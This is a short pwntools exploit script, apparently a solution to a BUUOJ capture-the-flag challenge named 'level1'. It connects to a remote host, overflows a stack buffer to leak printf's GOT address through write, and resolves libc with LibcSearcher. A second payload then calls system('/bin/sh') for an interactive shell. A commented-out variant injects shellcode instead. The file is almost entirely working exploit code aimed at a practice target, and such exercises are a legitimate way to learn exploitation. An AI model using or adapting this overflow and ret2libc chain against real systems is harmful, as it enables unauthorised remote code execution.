from pwn import *
from LibcSearcher import *
context(os = 'linux', arch = 'i386')
context.log_level = 'debug'

# ======================= ret2libc===========================================
p = remote('node4.buuoj.cn', 25711)

# 服务端有问题，这实际上是收不到的
# p.recvuntil(b'What\'s this:')
# vuln_stack_buf_addr = int(p.recv(10).decode(), 16)
# p.success(hex(vuln_stack_buf_addr))
main_addr = 0x80484b7
write_plt = 0x8048370
e = ELF('./level1')

payload1 = b'a'*(0x88+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(e.got['printf']) + p32(4)
p.send(payload1)

# p.recvuntil(b'\n')
printf_addr = u32(p.recv(4))
p.info(hex(printf_addr))

libc = LibcSearcher('printf', printf_addr)
libc_base = printf_addr - libc.dump('printf')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload2 = b'a'*(0x88+4) + p32(system) + p32(0xdeadbeef) + p32(binsh)
p.send(payload2)

p.interactive()

# ======================= shellcode: 本地能通，远程通不了=======================

# p = process('./level1')
# shellcode = asm(shellcraft.i386.sh())
# p.recvuntil(b'What\'s this:')
# vuln_stack_buf_addr = int(p.recv(10).decode(), 16)
# p.success(hex(vuln_stack_buf_addr))

# payload = shellcode.ljust(0x88, b'\x00')+p32(0xdeadbeef) + p32(vuln_stack_buf_addr)
# p.send(payload)
# p.interactive()
